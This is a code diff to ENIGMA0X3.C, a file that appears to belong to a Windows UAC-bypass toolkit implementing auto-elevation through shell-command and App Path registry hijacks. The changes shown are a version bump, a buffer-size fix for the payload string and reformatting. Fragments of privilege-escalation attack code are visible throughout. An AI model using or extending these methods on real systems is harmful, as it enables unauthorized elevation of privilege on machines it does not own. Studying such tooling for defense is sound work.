@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.73
+*  VERSION:     2.74
 *
-*  DATE:        27 May 2017
+*  DATE:        20 June 2017
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -62,7 +62,7 @@ BOOL ucmHijackShellCommandMethod(
             sz = 0x1000;
         }
         else {
-            sz = _strlen(lpszPayload) * sizeof(WCHAR);
+            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
         }
         lpBuffer = supHeapAlloc(sz);
         if (lpBuffer == NULL)
@@ -162,7 +162,8 @@ DWORD ucmDiskCleanupWorkerThread(
 
         InitializeObjectAttributes(&ObjectAttributes, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);
 
-        status = NtCreateFile(&hDirectory, FILE_LIST_DIRECTORY | SYNCHRONIZE,
+        status = NtCreateFile(&hDirectory, 
+            FILE_LIST_DIRECTORY | SYNCHRONIZE,
             &ObjectAttributes,
             &IoStatusBlock,
             NULL,
@@ -171,8 +172,7 @@ DWORD ucmDiskCleanupWorkerThread(
             FILE_OPEN,
             FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
             NULL,
-            0
-        );
+            0);
 
         if (!NT_SUCCESS(status))
             break;
@@ -362,7 +362,7 @@ BOOL ucmAppPathMethod(
             sz = 0x1000;
         }
         else {
-            sz = _strlen(lpszPayload) * sizeof(WCHAR);
+            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
         }
         lpBuffer = supHeapAlloc(sz);
         if (lpBuffer == NULL)
